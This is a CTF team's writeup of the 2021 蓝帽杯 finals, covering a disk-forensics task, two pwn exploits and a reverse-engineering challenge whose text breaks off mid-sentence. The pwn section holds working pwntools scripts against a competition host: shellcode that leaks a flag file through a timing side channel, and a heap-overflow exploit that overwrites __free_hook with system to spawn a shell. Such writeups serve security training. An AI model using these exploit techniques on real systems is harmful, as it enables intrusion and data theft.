<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件
winhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为
In order to prevent leaving evidence, Zhang San deleted all the key evidence photos. 因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png
Pwn secretcode 掏出初赛的代码稍微改改
from pwn import * import sys # context.log_level = &amp;#34;debug&amp;#34; context.arch = &amp;#39;amd64&amp;#39; if len(sys.argv) &amp;lt; 2: debug = True else: debug = False ru = lambda x : p.'><title>2021蓝帽杯决赛 Writeup</title>

<link rel='canonical' href='https://or4ngesec.github.io/post/bluehat-final-writeup/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='2021蓝帽杯决赛 Writeup'>
<meta property='og:description' content='Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件
winhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为
In order to prevent leaving evidence, Zhang San deleted all the key evidence photos. 因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png
Pwn secretcode 掏出初赛的代码稍微改改
from pwn import * import sys # context.log_level = &amp;#34;debug&amp;#34; context.arch = &amp;#39;amd64&amp;#39; if len(sys.argv) &amp;lt; 2: debug = True else: debug = False ru = lambda x : p.'>
<meta property='og:url' content='https://or4ngesec.github.io/post/bluehat-final-writeup/'>
<meta property='og:site_name' content='or4nge'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='蓝帽杯' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='Re' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Crypto' /><meta property='article:published_time' content='2021-11-05T16:23:41&#43;08:00'/><meta property='article:modified_time' content='2021-11-05T16:23:41&#43;08:00'/>
<meta name="twitter:title" content="2021蓝帽杯决赛 Writeup">
<meta name="twitter:description" content="Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件
winhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为
In order to prevent leaving evidence, Zhang San deleted all the key evidence photos. 因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png
Pwn secretcode 掏出初赛的代码稍微改改
from pwn import * import sys # context.log_level = &amp;#34;debug&amp;#34; context.arch = &amp;#39;amd64&amp;#39; if len(sys.argv) &amp;lt; 2: debug = True else: debug = False ru = lambda x : p.">
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/writeup/" >
                Writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/bluehat-final-writeup/">2021蓝帽杯决赛 Writeup</a>
    </h2>

    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Nov 05, 2021</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    5 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h2 id="misc">Misc</h2>
<h3 id="溯源取证张三的电脑">溯源取证——张三的电脑</h3>
<p>下载得到压缩包，经过判断类型后得知是 <code>VMDK</code> 文件，用 vmware 挂载。其中得到了 <code>zhangsan.001</code> 和 <code>zhangsan.ad1.txt</code> 两个文件</p>
<p>winhex挂载 <code>zhangsan.001</code>，在分区1的 <code>$RECYCLE.BIN</code> 中找到 <code>tips.txt.txt</code> 文件，内容为</p>
<pre tabindex="0"><code>In order to prevent leaving evidence, Zhang San deleted all the key evidence photos.
</code></pre><p>因此寻找 png 文件，同样在分区1的 <code>$RECYCLE.BIN</code> 中找到了包含相应的 flag 图片 <code>$REFK9A1.png</code></p>
<h2 id="pwn">Pwn</h2>
<h3 id="secretcode">secretcode</h3>
<p>掏出初赛的代码稍微改改</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#34;debug&#34;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ru <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
</span></span><span style="display:flex;"><span>sn <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
</span></span><span style="display:flex;"><span>rl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)
</span></span><span style="display:flex;"><span>rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recv(x)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendafter(a,b)
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendlineafter(a, b)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">debugf</span>(b<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> b:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(p,<span style="color:#e6db74">&#34;b *$rebase(</span><span style="color:#e6db74">{b}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(b <span style="color:#f92672">=</span> hex(b)))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>(p, index, ch):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># open</span>
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;push 0x1003caaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># re open, rax =&gt; 4</span>
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;and ecx,0x15;inc ecx;&#34;</span>
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;s:push 2; pop rax; push rcx;syscall; pop rcx;loop s;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># read(rax, 0x10040, 0x50)</span>
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># cmp and jz</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> index <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;cmp byte ptr[rsi+</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">], </span><span style="color:#e6db74">{1}</span><span style="color:#e6db74">; jz $-3; ret&#34;</span><span style="color:#f92672">.</span>format(index, ch)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;cmp byte ptr[rsi+</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">], </span><span style="color:#e6db74">{1}</span><span style="color:#e6db74">; jz $-4; ret&#34;</span><span style="color:#f92672">.</span>format(index, ch)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> asm(shellcode)
</span></span><span style="display:flex;"><span>    pay <span style="color:#f92672">=</span> shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x40</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag&#39;</span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(hex(len(pay)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;==</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pay)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>ans <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">127</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>                p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./chall&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;47.104.169.149&#39;</span>, <span style="color:#ae81ff">25178</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            pwn(p, index, ch)
</span></span><span style="display:flex;"><span>            start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>        end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> end <span style="color:#f92672">-</span> start <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1.5</span>:
</span></span><span style="display:flex;"><span>            ans<span style="color:#f92672">.</span>append(ch)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> ans]))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> ans]))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    index <span style="color:#f92672">=</span> index <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    print(ans)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> ans]))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="babynote">babynote</h3>
<p>abs32的洞，直接上下无限堆溢出</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./chall&#34;</span>)
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/home/daidaishou/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.104.169.149&#34;</span>,<span style="color:#e6db74">&#34;14269&#34;</span>)
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.27.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ru <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
</span></span><span style="display:flex;"><span>sn <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
</span></span><span style="display:flex;"><span>rl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)
</span></span><span style="display:flex;"><span>rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recv(x)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendafter(a,b)
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendlineafter(a, b)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">debugf</span>(b<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> b:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(p,<span style="color:#e6db74">&#34;b *$rebase(</span><span style="color:#e6db74">{b}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(b <span style="color:#f92672">=</span> hex(b)))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(i):
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">&#39;&gt; &#39;</span>, str(i))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(sz, c):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">&#39;size&gt; &#39;</span>, str(sz))
</span></span><span style="display:flex;"><span>    sa(<span style="color:#e6db74">&#39;msg&gt; &#39;</span>, c)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(i):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">&#39;idx&gt; &#39;</span>, str(i))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(i, offset, c):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">&#39;idx&gt; &#39;</span>, str(i))
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">&#39;offset&gt; &#39;</span>, str(offset))
</span></span><span style="display:flex;"><span>    sa(<span style="color:#e6db74">&#39;msg&gt; &#39;</span>, c)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(i):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">&#39;idx&gt; &#39;</span>, str(i))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>debugf()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x29c</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Chunk_0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x200</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Chunk_1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x78</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Chunk_2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x21f</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Chunk_3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80000000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x5e</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x80000000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x52</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x80</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x210</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x230</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x200</span>, <span style="color:#e6db74">&#39;Chunk_1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>show(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(rv(<span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3ebca0</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>warning(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>free_hook <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80000000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">12</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x80</span>)<span style="color:#f92672">+</span>p64(free_hook)<span style="color:#f92672">*</span><span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0xd8</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="re">Re</h2>
<h3 id="abc">abc</h3>
<p>动调，发现输入主要是进入一个case语句</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_401406</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v0; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// ecx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v0;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ( v1 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">:</span>                                   <span style="color:#75715e">// 右
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">return</span> sub_400A65();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;$&#39;</span><span style="color:#f92672">:</span>                                   <span style="color:#75715e">// 上
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">return</span> sub_40085B();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;%&#39;</span><span style="color:#f92672">:</span>                                   <span style="color:#75715e">// 左
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">return</span> sub_400B6D();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;@&#39;</span><span style="color:#f92672">:</span>                                   <span style="color:#75715e">// 下
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">return</span> sub_40095D();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  sub_4013EE();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> sub_400C6F();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>分别查看四个函数，发现主要是将内存中的-1与另一个数据进行交换</p>
<p>最后的验证逻辑为</p>
